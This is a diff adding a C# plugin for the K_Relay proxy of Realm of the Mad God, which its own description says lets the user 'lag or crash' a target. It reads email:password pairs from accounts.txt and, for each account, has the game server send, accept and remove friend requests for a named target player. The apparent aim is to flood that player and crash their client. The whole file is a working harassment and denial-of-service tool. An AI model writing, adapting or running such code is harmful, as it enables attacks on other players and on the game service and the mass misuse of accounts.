@@ -1,0 +1,77 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Lib_K_Relay;
+using Lib_K_Relay.Utilities;
+using Lib_K_Relay.Interface;
+using Lib_K_Relay.Networking;
+using Lib_K_Relay.Networking.Packets;
+using Lib_K_Relay.Networking.Packets.Client;
+using Lib_K_Relay.Networking.Packets.Server;
+using Lib_K_Relay.Networking.Packets.DataObjects;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+
+namespace laggymeister
+{
+    public class Class1: IPlugin
+    {
+		private bool _enabled = true;
+
+		public string GetAuthor()
+		{ return "x34"; }
+
+		public string GetName()
+		{ return "Laggmeister"; }
+
+		public string GetDescription()
+		{ return "This plugin lets you lag or crash depending on your account size"; }
+
+		public string[] GetCommands()
+		{ return new string[] { "null" }; }
+
+		public void Initialize(Proxy proxy)
+		{
+			proxy.HookCommand("lag:m", OnMyPluginCommand);
+			proxy.HookPacket(PacketType.PLAYERTEXT, OnPlayerText);
+		}
+
+		private void OnMyPluginCommand(Client client, string command, string[] args)
+		{
+			if (args.Length == 0) return;
+
+			if (args[0] == "enable") _enabled = true;
+			if (args[0] == "disable") _enabled = false;
+		}
+
+		private void OnPlayerText(Client client, Packet packet)
+		{
+			if (!_enabled) return;
+
+			//main plugin
+
+			string fileName = "accounts.txt";
+			var lines = File.ReadLines(fileName);
+			MessageBox.Show("Starting log...");
+			foreach (var line in lines)
+			{
+				string email = line.Substring(0, line.IndexOf(":"));
+				string password = line.Substring(line.IndexOf(":") + 1);
+				string target = File.ReadAllText("target.txt");
+
+				var clientez = new WebClient();
+				var main = clientez.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/requestFriend?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
+
+				var clients = new WebClient();
+				var remain = clients.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/acceptRequest?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
+
+				var clientss = new WebClient();
+				var reremain = clientss.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/removeFriend?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
+			}
+			MessageBox.Show("Finished log...");
+		}
+	}
+}
